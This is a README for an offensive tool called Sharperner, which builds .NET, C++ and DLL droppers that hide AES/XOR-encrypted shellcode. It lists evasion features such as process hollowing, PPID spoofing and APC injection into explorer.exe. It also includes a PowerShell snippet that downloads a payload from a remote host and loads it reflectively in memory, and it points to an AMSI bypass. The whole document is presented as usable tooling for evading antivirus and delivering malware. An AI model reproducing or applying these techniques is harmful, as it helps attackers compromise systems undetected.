# Sharperner
**Sharperner** is a tool written in CSharp that generate .NET dropper with AES and XOR obfuscated shellcode. Generated executable can possibly bypass signature check but I cant be sure it can bypass heuristic scanning. 

## Features
### Native C++ binary
* Process Hollowing
* PPID Spoofing
* Random generated AES key and iv
* Final Shellcode, Key and IV are translated to morse code

### DLL 
* Spawn as mobsync.exe
* Random generated AES key and iv
* Final Shellcode, Key and IV are translated to morse code

### .NET binary
* AES + XOR encrypted shellcode
* APC Process Injection (explorer.exe)
* Random function names
* Random generated AES key and iv
* Final Shellcode, Key and IV are translated to morse code

Sharperner now supports /convert functionality which will convert native binary/PE and manually mapped into .NET executable by using @SharpSploit library. This might be useful for reflective loading (execute-assembly)

## Usage
```
/file       B64,hex,raw 
/type       cs,cpp,dll
/out        Output file Location. (Optional)
/save       Keep pre compiled code. (Optional)

/convert    File input
            (Embed native executable to .NET Assembly using Manual Mapping)

Example:
Sharperner.exe /file:file.txt /type:cs
Sharperner.exe /file:file.txt /out:payload.exe /save
Sharperner.exe /convert:file.exe
```

## Caveat
* Install .NET 3.5 if Dlllauncher project throws errors. ([Download](https://www.microsoft.com/en-us/download/details.aspx?id=21))
* Make sure to have `msbuild.exe` in place to compile projects
* Native C++ payload might not work with long shellcode. Stageless most likely won't work.

## Suggestion
To avoid touching the disk, Generated .NET executable can be loaded reflectively with powershell. AMSI is the enemy now, [amsi.fail](https://amsi.fail) ftw!
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[TotallyNotMal.Program]::Main()
```

## References
* https://github.com/cobbr/SharpSploit
* https://github.com/fireeye/DueDLLigence
* https://github.com/cribdragg3r/Alaris
